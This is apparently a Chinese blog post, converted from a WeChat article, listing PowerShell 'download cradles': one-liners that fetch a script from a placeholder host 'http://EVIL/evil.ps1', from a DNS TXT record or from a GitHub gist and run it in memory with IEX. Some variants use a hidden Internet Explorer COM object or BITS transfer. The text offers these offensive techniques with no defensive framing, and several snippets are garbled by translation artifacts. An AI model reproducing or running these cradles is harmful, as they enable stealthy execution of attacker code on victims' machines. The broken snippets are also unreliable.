> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_TGwzdCZaukvNjDmNIAZvw)

普通下载
----

```
IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")
```

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBpxolLMuL6cBNB6CH3QvEwagyY6dgPN7F2Rg4PdJzwh6FCsph3jEtmyCvsG7JkZ3o1GQbXdffUDA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "微信截图_20201222152419.png")

  

PowerShell 3.0+
---------------

```
IEX (iwr 'http://EVIL/evil.ps1'）
```

  

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBpxolLMuL6cBNB6CH3QvEwnWcVdl7rY9VicEo6bE1hz6gaNjPknBaiaUuibQBYbDVIYEeZJADL6icoUw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "微信截图_20201222152624.png")

  

---

隐藏的IE com对象
-----------

```
`$ie=New-Object -comobject InternetExplorer.Application;``$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');``start-sleep -s 5;``$r=$ie.Document.body.innerHTML;``$ie.quit();``IEX $r`
```

  

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBpxolLMuL6cBNB6CH3QvEwf9auKMDMy4BauXKk7QLWX2jzicHibD1RF7DcH9rmuNZ0pmDPMrSuiahug/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "微信截图_20201222153942.png")

  

Msxml2.XMLHTTP COM对象
--------------------

```
`$h=New-Object -ComObject Msxml2.XMLHTTP``$h.open('GET','http://EVIL/evil.ps1',$false);``$h.send();``iex $h.responseText`
```

  

  

---

WinHttp COM对象（不识别代理！）
---------------------

```
`$ h = new-object -com WinHttp.WinHttpRequest.5.1;` `$ h.open（'GET'，' http：//EVIL/evil.ps1',$false）;` `$ h.send（）;` `iex $ h.qesponseText`
```

  

  

---

使用bitstransfer
--------------

```
`Import-Module bitstransfer;` `Start-BitsTransfer'http ：//EVIL/evil.ps1'$ env：temp \ t;` `$ r = gc $ env：temp \ t; rm $ env：tempt;` `iex $ r`
```

  

  
  

PowerBreach的DNS TXT方法
---------------------

要执行的代码必须是存储在TXT记录中的base64编码的字符串

```
IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"'[0]))))
```

```
`<#``<?xml version="1.0"?>``<command>` `<a>` `<execute>Get-Process</execute>` `</a>` `</command>``#>``$a = New-Object System.Xml.XmlDocument``$a.Load("https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt")``$a.command.a.execute | iex`
```